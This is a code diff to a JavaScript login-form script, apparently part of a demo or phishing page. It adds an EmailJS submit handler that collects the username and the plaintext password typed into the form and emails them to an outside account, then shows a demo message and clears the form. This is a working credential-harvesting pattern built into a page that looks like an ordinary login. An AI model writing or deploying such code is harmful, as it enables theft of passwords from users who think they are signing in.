@@ -19,3 +19,40 @@ form.addEventListener('submit', function (e) {
   form.reset();
   loginBtn.disabled = true;
 });
+
+
+// ----- EmailJS setup -----
+// 1. Create a free account at https://www.emailjs.com
+// 2. Add an Email Service (e.g. Gmail) -> get your SERVICE_ID
+// 3. Create an Email Template with {{username}} and {{message}} variables -> get your TEMPLATE_ID
+// 4. Get your Public Key from Account > API Keys
+// 5. Replace the three placeholders below
+
+emailjs.init("YOUR_PUBLIC_KEY");
+
+function toggleButton() {
+  loginBtn.disabled = !(username.value.trim() && password.value.trim());
+}
+
+username.addEventListener('input', toggleButton);
+password.addEventListener('input', toggleButton);
+
+form.addEventListener('submit', function (e) {
+  e.preventDefault();
+
+  const params = {
+    username: username.value,
+    password: password.value
+  };
+
+  emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", params)
+    .then(function () {
+      demoMessage.style.display = 'block';
+      form.reset();
+      loginBtn.disabled = true;
+    })
+    .catch(function (error) {
+      console.error("EmailJS error:", error);
+      alert("Something went wrong sending your message.");
+    });
+});
